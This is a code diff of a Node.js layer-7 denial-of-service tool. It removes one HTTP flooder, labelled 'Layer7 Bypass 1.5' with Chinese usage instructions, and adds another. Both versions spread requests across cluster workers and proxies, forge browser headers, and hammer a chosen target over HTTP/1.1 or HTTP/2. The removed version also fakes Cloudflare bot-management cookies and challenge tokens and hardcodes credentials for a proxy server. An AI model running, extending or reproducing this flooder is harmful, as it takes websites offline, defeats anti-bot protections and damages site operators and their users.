+     "Mozilla/5.0 (Linux; Android 10; MI 9 Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 MMWEBID/9769 MicroMessenger/7.0.10.1580(0x27000A73) Process/tools NetType/WIFI Language/zh_CN ABI/arm64",
+     "Mozilla/5.0 (Linux; Android 10; ELE-AL00 Build/HUAWEIELE-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/45016 Mobile Safari/537.36 MMWEBID/3732 MicroMessenger/7.0.10.1580(0x27000A55) Process/tools NetType/4G Language/zh_CN ABI/arm64",
+     "ozilla/5.0 (Linux; Android 9; ALP-AL00 Build/HUAWEIALP-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/045018 Mobile Safari/537.36 MMWEBID/8071 MicroMessenger/7.0.10.1580(0x27000AFC) Process/tools NetType/WIFI Language/zh_CN ABI/arm64"
+ ];
 
-let isFull = process.argv.includes('--full');
+ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+ var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
+ var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
+ var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
+ var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
+ var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
+ var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
+ var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
+ var proxies = readLines(args.proxyFile);
+ const parsedTarget = url.parse(args.target);
+ 
+      if (cluster.isMaster) {
+        for (let counter = 1; counter <= args.threads; counter++) {
+          cluster.fork();
+        }
+      } else {
+        setInterval(runFlooder);
+      };
+ 
+ class NetSocket {
+     constructor(){}
+ 
+  HTTP(options, callback) {
+     const parsedAddr = options.address.split(":");
+     const addrHost = parsedAddr[0];
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+     const buffer = new Buffer.from(payload);
+ 
+     const connection = net.connect({
+         host: options.host,
+         port: options.port
+     });
+ 
+     connection.setTimeout(options.timeout * 100000);
+     connection.setKeepAlive(true, 100000);
+ 
+     connection.on("connect", () => {
+         connection.write(buffer);
+     });
+ 
+     connection.on("data", chunk => {
+         const response = chunk.toString("utf-8");
+         const isAlive = response.includes("HTTP/1.1 200");
+         if (isAlive === false) {
+             connection.destroy();
+             return callback(undefined, "error: invalid response from proxy server");
+         }
+         return callback(connection, undefined);
+     });
+ 
+     connection.on("timeout", () => {
+         connection.destroy();
+         return callback(undefined, "error: timeout exceeded");
+     });
+ 
+     connection.on("error", error => {
+         connection.destroy();
+         return callback(undefined, "error: " + error);
+     });
+ }
+ }
 
-const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
-const reqmethod = process.argv[2];
-const target = process.argv[3];
-const time = process.argv[4];
-const threads = process.argv[5];
-const ratelimit = process.argv[6];
-const proxyfile = process.argv[7];
-const queryIndex = process.argv.indexOf('--query');
-const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
-const bfmFlagIndex = process.argv.indexOf('--bfm');
-const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
-const delayIndex = process.argv.indexOf('--delay');
-const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
-const cookieIndex = process.argv.indexOf('--cookie');
-const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
-const refererIndex = process.argv.indexOf('--referer');
-const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
-const postdataIndex = process.argv.indexOf('--postdata');
-const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
-const randrateIndex = process.argv.indexOf('--randrate');
-const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
-const customHeadersIndex = process.argv.indexOf('--header');
-const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
+ const Socker = new NetSocket();
+ headers[":method"] = "GET";
+ headers[":authority"] = parsedTarget.host;
+ headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+ headers[":scheme"] = "https";
+ headers["x-forwarded-proto"] = "https";
+ headers["accept-language"] = lang;
+ headers["accept-encoding"] = encoding;
+ headers["cache-control"] = control;
+ headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+ headers["sec-ch-ua-mobile"] = "?0";
+ headers["sec-ch-ua-platform"] = "Windows";
+ headers["upgrade-insecure-requests"] = "1";
+ headers["accept"] = accept;
+ headers["user-agent"] = randstr(15);
+ headers["sec-fetch-dest"] = "document";
+ headers["sec-fetch-mode"] = "navigate";
+ headers["sec-fetch-site"] = "none";
+ headers["TE"] = "trailers";
+ headers["sec-fetch-user"] = "?1";
+ headers["x-requested-with"] = "XMLHttpRequest";
+ 
+ function runFlooder() {
+     const proxyAddr = randomElement(proxies);
+     const parsedProxy = proxyAddr.split(":"); 
+         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
+         headers["origin"] = "https://" + parsedTarget.host;
 
-const forceHttpIndex = process.argv.indexOf('--http');
-const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
-const debugMode = process.argv.includes('--debug') && forceHttp != 1;
+     const proxyOptions = {
+         host: parsedProxy[0],
+         port: ~~parsedProxy[1],
+         address: parsedTarget.host + ":443",
+         timeout: 100,
+     };
 
-if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
-    console.clear();
-    console.error(`
-    Layer7 Bypass 1.5
-    如何使用&示例:
-      node ${process.argv[1]} <GET/POST> <目标> <时间> <线程> <速率限制> <代理文件>
-      node ${process.argv[1]} GET https://www.google.com/?q=%RAND% 60 15 50 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
+     Socker.HTTP(proxyOptions, (connection, error) => {
+         if (error) return
+ 
+         connection.setKeepAlive(true, 600000);
+
+         const tlsOptions = {
+            host: parsedTarget.host,
+            port: 443,
+            secure: true,
+            ALPNProtocols: ['h2'],
+            sigals: siga,
+            socket: connection,
+            ciphers: tls.getCiphers().join(":") + cipper,
+            ecdhCurve: "prime256v1:X25519",
+            host: parsedTarget.host,
+            rejectUnauthorized: false,
+            servername: parsedTarget.host,
+            secureProtocol: "TLS_method",
+        };
+
+         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+
+         tlsConn.setKeepAlive(true, 60000);
+
+         const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         });
+ 
+         client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          });
+ 
+         client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
     
-    选项：
-      --query 1/2/3 - 带有随机数的查询字符串 ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - q?=fwfwwffw
-      --delay <1-1000> - 请求之间的延迟 1-100 毫秒（最佳）默认 1 毫秒
-      --cookie "f=f" - 用于自定义 cookie
-      --bfm true/null - 如果需要，机器人战斗模式更改为 true，如果不需要则不要使用
-      --referer https://target.com / rand - 如果需要，请使用自定义 referer 和 rand - 如果需要，请使用生成域名，例如： bbbdududu.com
-      --postdata "user=f&pass=%RAND%" - 如果您需要数据来发布请求方法格式“user=f&pass=f”
-      --randrate - 随机率 1 至 90 最佳绕过率
-      --full - 此新功能仅用于攻击大型后端，例如亚马逊 Akamai 和其他...支持CF
-      --http 1/2/mix - 新功能选择类型 http 1/2/mix (mix 1 & 2)
-      --debug - 显示你的状态代码（可能降低 rps 以占用更多资源）
-      --header "f:f" or "f:f#f1:f1" - 如果你需要这个，请使用自定义标题，用#分割每个标题
-    `);
-
-    process.exit(1);
-}
-
-let hcookie = '';
-
-const url = new URL(target)
-const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
-
-if (currentDate > targetDate) {
-    console.error('错误方法');
-    process.exit(1);
-}
-
-if (url.hostname.endsWith(blockedDomain)) {
-    console.log(`目标${blockedDomain}被阻止…`);
-    process.exit(1);
-}
-
-if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
-    console.error('错误请求方法只能是GET/POST/HEAD/OPTIONS');
-    process.exit(1);
-}
-
-if (!target.startsWith('https://')) {
-    console.error('协议只能为 https://');
-    process.exit(1);
-}
-
-if (isNaN(time) || time <= 0 || time > 86400) {
-    console.error('时间不能超过86400')
-    process.exit(1);
-}
-
-if (isNaN(threads) || threads <= 0 || threads > 256) {
-    console.error('线程不能超过256')
-    process.exit(1);
-}
-
-if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 100) {
-    console.error(`速率限制不能超过100`)
-    process.exit(1);
-}
-
-if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
-    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
-}
-
-if (cookieValue) {
-    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
-}
-
-function encodeFrame(streamId, type, payload = "", flags = 0) {
-    let frame = Buffer.alloc(9)
-    frame.writeUInt32BE(payload.length << 8 | type, 0)
-    frame.writeUInt8(flags, 4)
-    frame.writeUInt32BE(streamId, 5)
-    if (payload.length > 0)
-        frame = Buffer.concat([frame, payload])
-    return frame
-}
-
-function decodeFrame(data) {
-    const lengthAndType = data.readUInt32BE(0)
-    const length = lengthAndType >> 8
-    const type = lengthAndType & 0xFF
-    const flags = data.readUint8(4)
-    const streamId = data.readUInt32BE(5)
-    const offset = flags & 0x20 ? 5 : 0
-
-    let payload = Buffer.alloc(0)
-
-    if (length > 0) {
-        payload = data.subarray(9 + offset, 9 + offset + length)
-
-        if (payload.length + offset != length) {
-            return null
-        }
-    }
-
-    return {
-        streamId,
-        length,
-        type,
-        flags,
-        payload
-    }
-}
-
-function encodeSettings(settings) {
-    const data = Buffer.alloc(6 * settings.length)
-    for (let i = 0; i < settings.length; i++) {
-        data.writeUInt16BE(settings[i][0], i * 6)
-        data.writeUInt32BE(settings[i][1], i * 6 + 2)
-    }
-    return data
-}
-
-function encodeRstStream(streamId, type, flags) {
-    const frameHeader = Buffer.alloc(9);
-    frameHeader.writeUInt32BE(4, 0);
-    frameHeader.writeUInt8(type, 4);
-    frameHeader.writeUInt8(flags, 5);
-    frameHeader.writeUInt32BE(streamId, 5);
-    const statusCode = Buffer.alloc(4).fill(0);
-
-    return Buffer.concat([frameHeader, statusCode]);
-}
-
-const getRandomChar = () => {
-    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
-    const randomIndex = Math.floor(Math.random() * pizda4.length);
-    return pizda4[randomIndex];
-};
-
-function randstr(length) {
-    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    let result = "";
-    const charactersLength = characters.length;
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
-}
-
-if (url.pathname.includes("%RAND%")) {
-    const randomValue = randstr(6) + "&" + randstr(6);
-    url.pathname = url.pathname.replace("%RAND%", randomValue);
-}
-
-function randstrr(length) {
-    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
-    let result = "";
-    const charactersLength = characters.length;
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * charactersLength));
-    }
-    return result;
-}
-
-function generateRandomString(minLength, maxLength) {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        const randomIndex = Math.floor(Math.random() * characters.length);
-        result += characters[randomIndex];
-    }
-    return result;
-}
-
-function ememmmmmemmeme(minLength, maxLength) {
-    const characters = 'abcdefghijklmnopqrstuvwxyz';
-    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        const randomIndex = Math.floor(Math.random() * characters.length);
-        result += characters[randomIndex];
-    }
-    return result;
-}
-
-function getRandomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function buildRequest() {
-    const browserVersion = getRandomInt(120, 123);
-
-    const fwfw = ['Google Chrome', 'Brave'];
-    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
-
-    let brandValue;
-    if (browserVersion === 120) {
-        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
-    }
-    else if (browserVersion === 121) {
-        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
-    }
-    else if (browserVersion === 122) {
-        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
-    }
-    else if (browserVersion === 123) {
-        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
-    }
-
-    const isBrave = wfwf === 'Brave';
-
-    const acceptHeaderValue = isBrave
-        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
-
-    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
-    const secChUa = `${brandValue}`;
-    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
-
-    let mysor = '\r\n';
-    let mysor1 = '\r\n';
-    if (hcookie || currentRefererValue) {
-        mysor = '\r\n'
-        mysor1 = '';
-    } else {
-        mysor = '';
-        mysor1 = '\r\n';
-    }
-
-    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
-        `Accept: ${acceptHeaderValue}\r\n` +
-        'Accept-Encoding: gzip, deflate, br\r\n' +
-        'Accept-Language: en-US,en;q=0.7\r\n' +
-        'Connection: Keep-Alive\r\n' +
-        `Host: ${url.hostname}\r\n` +
-        'Sec-Fetch-Dest: document\r\n' +
-        'Sec-Fetch-Mode: navigate\r\n' +
-        'Sec-Fetch-Site: none\r\n' +
-        'Sec-Fetch-User: ?1\r\n' +
-        'Upgrade-Insecure-Requests: 1\r\n' +
-        `User-Agent: ${userAgent}\r\n` +
-        `sec-ch-ua: ${secChUa}\r\n` +
-        'sec-ch-ua-mobile: ?0\r\n' +
-        'sec-ch-ua-platform:  "Windows"\r\n' + mysor1;
-
-    if (hcookie) {
-        headers += `Cookie: ${hcookie}\r\n`;
-    }
-
-    if (currentRefererValue) {
-        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
-    }
-
-    const mmm = Buffer.from(`${headers}`, 'binary');
-    //console.log(headers.toString());
-    return mmm;
-}
-
-const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
-
-function go() {
-    //const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
-    let tlsSocket;
-
-    const proxyString = "TyvCgkMO:YesVXDydcavNrdLk@116.202.98.252:47212";
-    const regex = /^(.*?):(.*?)@(.*?):(\d+)$/;
-    const matches = proxyString.match(regex);    
-    const [, username, password, proxyHost, proxyPort] = matches;
-    //console.log("Username:", username);
-    //console.log("Password:", password);
-    //console.log("IP:", proxyHost);
-    //console.log("Port:", proxyPort);
-    const authString = Buffer.from(`${username}:${password}`).toString('base64');
-
-
-    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
-        netSocket.once('data', () => {
-            tlsSocket = tls.connect({
-                socket: netSocket,
-                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
-                servername: url.host,
-                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
-                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
-                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
-                secure: true,
-                minVersion: 'TLSv1.2',
-                maxVersion: 'TLSv1.3',
-                honorCipherOrder: false,
-                rejectUnauthorized: false
-            }, () => {
-                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
-
-                    if (forceHttp == 2) {
-                        tlsSocket.end(() => tlsSocket.destroy())
-                        return
-                    }
-
-                    function doWrite() {
-                        tlsSocket.write(http1Payload, (err) => {
-                            if (!err) {
-                                setTimeout(() => {
-                                    doWrite()
-                                }, isFull ? 1000 : 1000 / ratelimit)
-                            } else {
-                                tlsSocket.end(() => tlsSocket.destroy())
-                            }
-                        })
-                    }
-
-                    doWrite()
-
-                    tlsSocket.on('error', () => {
-                        tlsSocket.end(() => tlsSocket.destroy())
-                    })
-
-                    return
+                    request.end();
                 }
-
-                if (forceHttp == 1) {
-                    tlsSocket.end(() => tlsSocket.destroy())
-                    return
-                }
-
-                let streamId = 1
-                let data = Buffer.alloc(0)
-                let hpack = new HPACK()
-                hpack.setTableSize(4096)
-
-                let updateWindow = Buffer.alloc(4);
-                updateWindow.writeUInt32BE(15663105, 0);
-
-                const headertablesize = Math.floor(Math.random() * 2) + 65535;
-                const frandom = Math.floor(Math.random() * 6);
-
-                let fchoicev1, fchoicev2;
-
-                if (frandom === 0) {
-                    fchoicev1 = 131072;
-                    fchoicev2 = 262142;
-                } else if (frandom === 1) {
-                    fchoicev1 = 131073;
-                    fchoicev2 = 262143;
-                } else if (frandom === 2) {
-                    fchoicev1 = 131074;
-                    fchoicev2 = 262144;
-                } else if (frandom === 3) {
-                    fchoicev1 = 6291455;
-                    fchoicev2 = 262145;
-                }
-                else if (frandom === 4) {
-                    fchoicev1 = 6291454;
-                    fchoicev2 = 262144;
-                }
-                else if (frandom === 5) {
-                    fchoicev1 = 6291456;
-                    fchoicev2 = 262146;
-                }
-
-
-                const frames = [
-                    Buffer.from(PREFACE, 'binary'),
-                    encodeFrame(0, 4, encodeSettings([
-                        [1, headertablesize],
-                        [2, 0],
-                        [4, fchoicev1],
-                        [6, fchoicev2]
-                    ])),
-                    encodeFrame(0, 8, updateWindow)
-                ];
-
-                tlsSocket.on('data', (eventData) => {
-                    data = Buffer.concat([data, eventData])
-
-                    while (data.length >= 9) {
-                        const frame = decodeFrame(data)
-                        if (frame != null) {
-                            data = data.subarray(frame.length + 9)
-                            if (frame.type == 4 && frame.flags == 0) {
-                                tlsSocket.write(encodeFrame(0, 4, "", 1))
-                            }
-                            if (frame.type == 1 && debugMode) {
-                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
-                                if (!statuses[status])
-                                    statuses[status] = 0
-
-                                statuses[status]++
-                            }
-                            if (frame.type == 7 || frame.type == 5) {
-                                if (frame.type == 7) {
-                                    if (debugMode) {
-
-                                        //console.log("goaway", frame.payload.readUint32BE(0), frame.payload.readUint32BE(4))
-
-                                        if (!statuses["GOAWAY"])
-                                            statuses["GOAWAY"] = 0
-
-                                        statuses["GOAWAY"]++
-
-                                    }                                
-                                }
-                                //tlsSocket.write(encodeRstStream(0, 3, 0));
-                               // tlsSocket.end(() => tlsSocket.destroy())
-                            }
-
-                        } else {
-                            break
-                        }
-                    }
-                })
-
-                tlsSocket.write(Buffer.concat(frames))
-
-                function doWrite() {
-                    if (tlsSocket.destroyed) {
-                        return
-                    }
-                    //const fwq = getRandomInt(0,1);
-                    const requests = []
-                    const customHeadersArray = [];
-                    if (customHeaders) {
-                        const customHeadersList = customHeaders.split('#');
-                        for (const header of customHeadersList) {
-                            const [name, value] = header.split(':');
-                            if (name && value) {
-                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
-                            }
-                        }
-                    }
-                    let ratelimit;
-                    if (randrate !== undefined) {
-                        ratelimit = getRandomInt(1, 90);
-                    } else {
-                        ratelimit = process.argv[6];
-                    }
-                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
-                        const browserVersion = getRandomInt(120, 123);
-
-                        const fwfw = ['Google Chrome', 'Brave'];
-                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
-                        const ref = ["same-site", "same-origin", "cross-site"];
-                        const ref1 = ref[Math.floor(Math.random() * ref.length)];
-
-                        let brandValue;
-                        if (browserVersion === 120) {
-                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                        } else if (browserVersion === 121) {
-                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
-                        }
-                        else if (browserVersion === 122) {
-                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                        }
-                        else if (browserVersion === 123) {
-                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
-                        }
-
-                        const isBrave = wfwf === 'Brave';
-
-                        const acceptHeaderValue = isBrave
-                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
-
-                        const secGpcValue = isBrave ? "1" : undefined;
-
-                        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
-                        const secChUa = `${brandValue}`;
-                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
-                        const headers = Object.entries({
-                            ":method": reqmethod,
-                            ":authority": url.hostname,
-                            ":scheme": "https",
-                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
-                        }).concat(Object.entries({
-                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
-                            ...(reqmethod === "POST" && { "content-length": "0" }),
-                            "sec-ch-ua": secChUa,
-                            "sec-ch-ua-mobile": "?0",
-                            "sec-ch-ua-platform": `\"Windows\"`,
-                            "upgrade-insecure-requests": "1",
-                            "user-agent": userAgent,
-                            "accept": acceptHeaderValue,
-                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
-                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
-                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-                            "accept-encoding": "gzip, deflate, br",
-                            "accept-language": "en-US,en;q=0.9",
-                            //...(Math.random() < 0.4 && { "priority": `u=${fwq}, i` }),
-                            ...(hcookie && { "cookie": hcookie }),
-                            ...(currentRefererValue && { "referer": currentRefererValue }),
-                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
-                        }).filter(a => a[1] != null));
-
-                        const headers2 = Object.entries({
-                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
-                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
-                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
-                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
-                        }).filter(a => a[1] != null);
-
-                        for (let i = headers2.length - 1; i > 0; i--) {
-                            const j = Math.floor(Math.random() * (i + 1));
-                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
-                        }
-
-                        const combinedHeaders = headers.concat(headers2);
-
-                        function handleQuery(query) {
-                            if (query === '1') {
-                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
-                            } else if (query === '2') {
-                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
-                            } else if (query === '3') {
-                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
-                            } else {
-                                return url.pathname;
-                            }
-                        }
-
-                        const packed = Buffer.concat([
-                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
-                            hpack.encode(combinedHeaders)
-                        ]);
-
-                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
-                        streamId += 2
-                    }
-
-                    tlsSocket.write(Buffer.concat(requests), (err) => {
-                        if (!err) {
-                            setTimeout(() => {
-                                doWrite()
-                            }, isFull ? 1000 : 1000 / ratelimit)
-                        }
-                    })
-                }
-
-                doWrite()
-            }).on('error', () => {
-                tlsSocket.destroy()
-            })
-        })
-
-        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
-    }).once('error', () => { }).once('close', () => {
-        if (tlsSocket) {
-            tlsSocket.end(() => { tlsSocket.destroy(); go() })
-        }
-    })
-}
-
-if (cluster.isMaster) {
-
-    const workers = {}
-
-    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
-    console.log(`Layer7 Bypass\n攻击已开始…`);
-
-    cluster.on('exit', (worker) => {
-        cluster.fork({ core: worker.id % os.cpus().length });
-    });
-
-    cluster.on('message', (worker, message) => {
-        workers[worker.id] = [worker, message]
-    })
-    if (debugMode) {
-        setInterval(() => {
-
-            let statuses = {}
-            for (let w in workers) {
-                if (workers[w][0].state == 'online') {
-                    for (let st of workers[w][1]) {
-                        for (let code in st) {
-                            if (statuses[code] == null)
-                                statuses[code] = 0
-
-                            statuses[code] += st[code]
-                        }
-                    }
-                }
-            }
-            console.clear()
-            console.log(new Date().toLocaleString('us'), statuses)
-        }, 1000)
-    }
-
-    setTimeout(() => process.exit(1), time * 1000);
-
-} else {
-        let i = setInterval(() => {
-            go()
-        }, delay);
-
-
-    if (debugMode) {
-        setInterval(() => {
-            if (statusesQ.length >= 4)
-                statusesQ.shift()
-
-            statusesQ.push(statuses)
-            statuses = {}
-            process.send(statusesQ)
-        }, 250)
-    }
-
-    setTimeout(() => process.exit(1), time * 1000);
-}
+            }, 1000); 
+         });
+ 
+         client.on("close", () => {
+             client.destroy();
+             connection.destroy();
+             return
+         });
+     }),function (error, response, body) {
+		};
+ }
+ console.log(gradient.vice(`[+] Bypass target…\ntarget：${target}｜time：${time}`));
+ const KillScript = () => process.exit(1);
+ setTimeout(KillScript, args.time * 1000);
